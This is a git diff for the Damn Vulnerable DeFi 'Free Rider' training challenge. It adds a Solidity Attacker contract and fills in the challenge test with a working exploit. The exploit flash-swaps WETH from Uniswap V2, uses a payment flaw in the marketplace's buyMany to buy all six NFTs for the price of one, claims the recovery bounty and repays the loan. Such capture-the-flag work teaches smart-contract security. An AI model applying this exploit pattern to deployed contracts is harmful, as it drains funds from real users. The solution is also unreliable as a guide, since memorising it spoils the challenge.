@@ -11,6 +11,67 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+contract Attacker is IERC721Receiver{
+    WETH weth;
+    IUniswapV2Pair uniswapPair;
+    FreeRiderNFTMarketplace marketplace;
+    FreeRiderRecoveryManager recoveryManager;
+    DamnValuableNFT nft;
+    address player;
+    uint256 constant NFT_PRICE = 15 ether;
+
+    constructor(
+        WETH _weth,
+        IUniswapV2Pair _uniswapPair,
+        FreeRiderNFTMarketplace _marketplace,
+        FreeRiderRecoveryManager _recoveryManager,
+        DamnValuableNFT _nft,
+        address _player
+    ) {
+        weth = _weth;
+        uniswapPair = _uniswapPair;
+        marketplace = _marketplace;
+        recoveryManager = _recoveryManager;
+        nft = _nft;
+        player = _player;
+    }
+
+    function startAttack() public {
+        bytes memory data = abi.encode(address(recoveryManager));
+        uniswapPair.swap(NFT_PRICE, 0, address(this), data);
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        uint256[] memory tokenIds = new uint256[](6);
+        for(uint256 i = 0; i < 6; i++) {
+            tokenIds[i] = i;
+        }
+        
+        weth.withdraw(NFT_PRICE);
+        marketplace.buyMany{value: NFT_PRICE}(tokenIds);
+        for(uint256 i = 0; i < 6; i++) {
+            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(player));
+        }
+
+        uint256 fee = (NFT_PRICE * 3) / 997 + 1;
+        weth.deposit{value: 15e18 + fee}();
+        weth.transfer(msg.sender, 15e18 + fee);
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external override returns (bytes4) {
+
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -123,7 +184,15 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker(
+            weth,
+            uniswapPair,
+            marketplace,
+            recoveryManager,
+            nft,
+            player
+        );
+        attacker.startAttack();
     }
 
     /**
